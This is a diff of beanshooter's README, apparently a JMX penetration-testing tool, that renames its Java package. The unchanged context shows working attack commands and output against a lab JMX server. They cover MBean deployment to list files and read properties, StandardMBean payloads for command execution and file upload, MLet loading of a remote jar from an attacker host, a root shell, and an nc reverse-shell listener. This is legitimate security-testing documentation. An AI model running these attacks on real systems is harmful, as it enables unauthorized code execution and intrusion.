@@ -463,11 +463,11 @@ The following listing shows an example usage, where an `File` object is provided
 and the `String[] list()` operation is invoked on it:
 
 ```console
-[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
+[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 eu.tneitzel.beanshooter:version=1 java.io.File 'new java.io.File("/")'
 [+] Deploying RequiredModelMBean supporting methods from java.io.File
 [+]
 [+] 	Deplyoing MBean: RequiredModelMBean
-[+] 	MBean with object name de.qtc.beanshooter:version=1 was successfully deployed.
+[+] 	MBean with object name eu.tneitzel.beanshooter:version=1 was successfully deployed.
 [+]
 [+] 	Available Methods:
 [+] 	  - java.lang.String toString()
@@ -478,7 +478,7 @@ and the `String[] list()` operation is invoked on it:
 [+]
 [+] 	Setting managed resource to: new java.io.File("/")
 [+] 	Managed resource was set successfully.
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 eu.tneitzel.beanshooter:version=1 --signature 'list()'
 root
 var
 opt
@@ -502,9 +502,9 @@ sys
 The `setManagedResource` method is always available and can be used to change the object instance to operate on:
 
 ```console
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'setManagedResource(Object a, String b)' 'new java.io.File("/etc")' objectReference
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 eu.tneitzel.beanshooter:version=1 --signature 'setManagedResource(Object a, String b)' 'new java.io.File("/etc")' objectReference
 [+] Call was successful.
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 eu.tneitzel.beanshooter:version=1 --signature 'list()'
 passwd
 shells
 opt
@@ -521,11 +521,11 @@ not matter. E.g. if you want to invoke `getProperties()` from `java.lang.System`
 as object instance. Only the specified class name matters in this case:
 
 ```console
-[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.lang.System '"does not matter"'
+[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 eu.tneitzel.beanshooter:version=1 java.lang.System '"does not matter"'
 [+] Deploying RequiredModelMBean supporting methods from java.lang.System
 [+]
 [+] 	Deplyoing MBean: RequiredModelMBean
-[+] 	MBean with object name de.qtc.beanshooter:version=1 was successfully deployed.
+[+] 	MBean with object name eu.tneitzel.beanshooter:version=1 was successfully deployed.
 [+]
 [+] 	Available Methods:
 [+] 	  - void runFinalization()
@@ -557,7 +557,7 @@ as object instance. Only the specified class name matters in this case:
 [+]
 [+] 	Setting managed resource to: "does not matter"
 [+] 	Managed resource was set successfully.
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'getProperties()'
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 eu.tneitzel.beanshooter:version=1 --signature 'getProperties()'
 java.vm.info
   --> mixed mode
 java.runtime.version
@@ -574,14 +574,14 @@ provide an object instance that is also not a default class (not present in `rt.
 the target class needs to be loaded by the same *ClassLoader* as the provided object instance. For *beanshooters*
 *example-server*, `javax.management.remote.message.VersionMessage` is suitable, as this class is present
 in `opendmk_jmxremote_optional_jar` which is present in the client as well as in the server. We can use
-this as an object instance to invoke methods on other custom classes, like `de.qtc.beanshooter.server.utils.Logger`:
+this as an object instance to invoke methods on other custom classes, like `eu.tneitzel.beanshooter.server.utils.Logger`:
 
 ```console
-[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=0 de.qtc.beanshooter.server.utils.Logger 'new javax.management.remote.message.VersionMessage("test")' --signature 'String getIndent()'
+[qtc@devbox ~]$ beanshooter model 172.17.0.2 9010 eu.tneitzel.beanshooter:version=0 eu.tneitzel.beanshooter.server.utils.Logger 'new javax.management.remote.message.VersionMessage("test")' --signature 'String getIndent()'
 [+] Deploying RequiredModelMBean supporting user specified methods
 [+]
 [+] 	Deplyoing MBean: RequiredModelMBean
-[+] 	MBean with object name de.qtc.beanshooter:version=0 was successfully deployed.
+[+] 	MBean with object name eu.tneitzel.beanshooter:version=0 was successfully deployed.
 [+]
 [+] 	Available Methods:
 [+] 	  - String getIndent()
@@ -589,7 +589,7 @@ this as an object instance to invoke methods on other custom classes, like `de.q
 [+]
 [+] 	Setting managed resource to: new javax.management.remote.message.VersionMessage("test")
 [+] 	Managed resource was set successfully.
-[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=0 --signature 'String getIndent()'
+[qtc@devbox ~]$ beanshooter invoke 172.17.0.2 9010 eu.tneitzel.beanshooter:version=0 --signature 'String getIndent()'
 EMPTY OUTPUT - Just an Indent ;)
 ```
 
@@ -659,7 +659,7 @@ the `--class-name`, `--object-name` and `--jar-file` options are required.
 [+] Requested resource: /
 [+] Sending mlet:
 [+]
-[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Class:     eu.tneitzel.beanshooter.tonkabean.TonkaBean
 [+] 	Archive:   93691b8bae4143f087f7a3123641b20d
 [+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
 [+] 	Codebase:  http://172.17.0.1:8888
@@ -680,12 +680,12 @@ and *beanshooter* implements it to allow command execution, file upload and *Ton
 [+] Creating a TemplateImpl payload object to abuse StandardMBean
 [+]
 [+] 	Deplyoing MBean: StandardMBean
-[+] 	MBean with object name de.qtc.beanshooter:standard=3873612041699 was successfully deployed.
+[+] 	MBean with object name eu.tneitzel.beanshooter:standard=3873612041699 was successfully deployed.
 [+]
 [+] 	Caught NullPointerException while invoking the newTransformer action.
 [+] 	This is expected bahavior and the attack most likely worked :)
 [+]
-[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=3873612041699 from the MBeanServer.
+[+] 	Removing MBean with ObjectName eu.tneitzel.beanshooter:standard=3873612041699 from the MBeanServer.
 [+] 	MBean was successfully removed.
 ...
 [qtc@devbox ~]$ nc -vlp 4444
@@ -710,12 +710,12 @@ recommended to use the *TonkaBean* deployment for executing commands:
 [+] Creating a TemplateImpl payload object to abuse StandardMBean
 [+]
 [+] 	Deplyoing MBean: StandardMBean
-[+] 	MBean with object name de.qtc.beanshooter:standard=4121868972140 was successfully deployed.
+[+] 	MBean with object name eu.tneitzel.beanshooter:standard=4121868972140 was successfully deployed.
 [+]
 [+] 	Caught NullPointerException while invoking the newTransformer action.
 [+] 	This is expected bahavior and the attack most likely worked :)
 [+]
-[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4121868972140 from the MBeanServer.
+[+] 	Removing MBean with ObjectName eu.tneitzel.beanshooter:standard=4121868972140 from the MBeanServer.
 [+] 	MBean was successfully removed.
 [qtc@devbox ~]$ beanshooter tonka shell 172.17.0.2 9010
 [root@172.17.0.2 /]$ id
@@ -730,7 +730,7 @@ you may be able to upload the *TonkaBean* Jar file and load it via *MLet* and th
 [qtc@devbox ~]$ beanshooter tonka export --stager-url file:///tmp/
 [+] Exporting MBean jar file: ./tonka-bean-4.0.0-jar-with-dependencies.jar
 [+] Exporting MLet HTML file to: ./index.html
-[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Class:     eu.tneitzel.beanshooter.tonkabean.TonkaBean
 [+] 	Archive:   tonka-bean-4.0.0-jar-with-dependencies.jar
 [+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
 [+] 	Codebase:  file:/tmp/
@@ -738,23 +738,23 @@ you may be able to upload the *TonkaBean* Jar file and load it via *MLet* and th
 [+] Creating a TemplateImpl payload object to abuse StandardMBean
 [+]
 [+] 	Deplyoing MBean: StandardMBean
-[+] 	MBean with object name de.qtc.beanshooter:standard=4825542879735 was successfully deployed.
+[+] 	MBean with object name eu.tneitzel.beanshooter:standard=4825542879735 was successfully deployed.
 [+]
 [+] 	Caught NullPointerException while invoking the newTransformer action.
 [+] 	This is expected bahavior and the attack most likely worked :)
 [+]
-[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4825542879735 from the MBeanServer.
+[+] 	Removing MBean with ObjectName eu.tneitzel.beanshooter:standard=4825542879735 from the MBeanServer.
 [+] 	MBean was successfully removed.
 [qtc@devbox ~]$ beanshooter standard 172.17.0.2 9010 upload index.html::/tmp/index.html
 [+] Creating a TemplateImpl payload object to abuse StandardMBean
 [+]
 [+] 	Deplyoing MBean: StandardMBean
-[+] 	MBean with object name de.qtc.beanshooter:standard=4836961801045 was successfully deployed.
+[+] 	MBean with object name eu.tneitzel.beanshooter:standard=4836961801045 was successfully deployed.
 [+]
 [+] 	Caught NullPointerException while invoking the newTransformer action.
 [+] 	This is expected bahavior and the attack most likely worked :)
 [+]
-[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=4836961801045 from the MBeanServer.
+[+] 	Removing MBean with ObjectName eu.tneitzel.beanshooter:standard=4836961801045 from the MBeanServer.
 [+] 	MBean was successfully removed.
 [qtc@devbox ~]$ beanshooter tonka deploy 172.17.0.2 9010 --stager-url file:///tmp/index.html
 [+] Starting MBean deployment.
@@ -861,7 +861,7 @@ a builtin jar file is available):
 [+] 			Requested resource: /
 [+] 			Sending mlet:
 [+]
-[+] 				Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 				Class:     eu.tneitzel.beanshooter.tonkabean.TonkaBean
 [+] 				Archive:   440441bf8c794d40a83caf1e34cd9993
 [+] 				Object:    MLetTonkaBean:name=TonkaBean,id=1
 [+] 				Codebase:  http://172.17.0.1:8000
@@ -891,7 +891,7 @@ form an *SMB* service listening on `10.10.10.5`, you could use the following com
 [qtc@devbox ~]$ beanshooter tonka export --export-dir export --stager-url file:////10.10.10.5/share/
 [+] Exporting MBean jar file: export/tonka-bean-3.0.0-jar-with-dependencies.jar
 [+] Exporting MLet HTML file to: export/index.html
-[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Class:     eu.tneitzel.beanshooter.tonkabean.TonkaBean
 [+] 	Archive:   tonka-bean-3.0.0-jar-with-dependencies.jar
 [+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
 [+] 	Codebase:  file:////10.10.10.5/share/
@@ -949,7 +949,7 @@ that *beanshooters* locally stores on the corresponding *MBean* and no server in
 [qtc@devbox ~]$ beanshooter tonka stats
 [+] MBean: tonka
 [+] 	Object Name: 	 MLetTonkaBean:name=TonkaBean,id=1
-[+] 	Class Name: 	 de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Class Name: 	 eu.tneitzel.beanshooter.tonkabean.TonkaBean
 [+] 	Jar File: 	     available (tonka-bean-3.0.0-jar-with-dependencies.jar)
 ```
 
@@ -1146,7 +1146,7 @@ an *MBean* class from a user specified *URL*:
 [+] 	Requested resource: /
 [+] 	Sending mlet:
 [+]
-[+] 		Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 		Class:     eu.tneitzel.beanshooter.tonkabean.TonkaBean
 [+] 		Archive:   3584de270132420aaf0812366bc46035
 [+] 		Object:    MLetTonkaBean:name=TonkaBean,id=1
 [+] 		Codebase:  http://172.17.0.1:8000
@@ -1163,7 +1163,7 @@ you want to load a custom *MBean* instead, you need to specify the keyword `cust
 the `--class-name`, `--object-name` and `--jar-file` options:
 
 ```console
-[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.ExampleBean --object-name ExampleBean:name=ExampleBean,id=1 --jar-file www/example.jar
+[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name eu.tneitzel.beanshooter.ExampleBean --object-name ExampleBean:name=ExampleBean,id=1 --jar-file www/example.jar
 [+] Starting MBean deployment.
 [+] ...
 [+] MBean was loaded successfully.
